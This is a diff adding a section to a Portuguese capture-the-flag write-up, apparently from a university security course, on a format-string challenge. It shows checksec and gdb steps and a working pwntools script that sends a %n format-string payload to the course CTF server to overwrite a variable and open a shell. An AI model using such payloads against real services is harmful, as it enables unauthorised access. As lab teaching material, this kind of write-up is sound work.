@@ -164,3 +164,37 @@ p.recvuntil(b"here...")
 p.sendline(b"\x24\xb3\x04\x08%48875x%1$n")
 ```
 ![image](assets/s7i7.png)
+
+
+### Competitivo 
+
+Neste desafio, localizado em `nc ctf-fsi.fe.up.pt 4008`, começamos por correr o `checksec` novamente, obtendo um resultado diferente: Relocation Read-Only não está ativado. O que significa que os binários podem ser alterados.
+
+![checksec program](assets/s7i8.png)
+
+De seguida corremos o programa localmente com o `gdb` e descobrimos o endereço da variável `key`:
+
+
+![endereço](assets/s7i9.png)
+
+Como cada endereço partilha um byte com o próximo, podemos concluir que em vez de este ser ```0x0804B320``` será utilizado o valor ```0x0804B31F```. Portanto, o nosso objetivo é enviar 0xBEEFXX para dar overflow na variável key e assim obter acesso ao terminal, onde X pode ser qyualquer valor até 0xEF. 
+
+Então para isso, utilizamos o seguinte código:
+
+```python
+
+from pwn import *
+
+LOCAL = False
+  
+p = remote("ctf-fsi.fe.up.pt", 4008)
+
+
+p.recvuntil(b"here...")
+p.sendline(b"AAAA\x1F\xB3\x04\x08%.12513020x%n")
+p.interactive()
+```
+
+Onde o valor ```12513024-4(endereço) = 12513020``` é o valor decimal de 0xBEEFXX, onde XX é o valor que queremos enviar. Por fim, para dar overflow, escrevemos então 4 ```A```. 
+
+![flag](assets/s7i10.png)
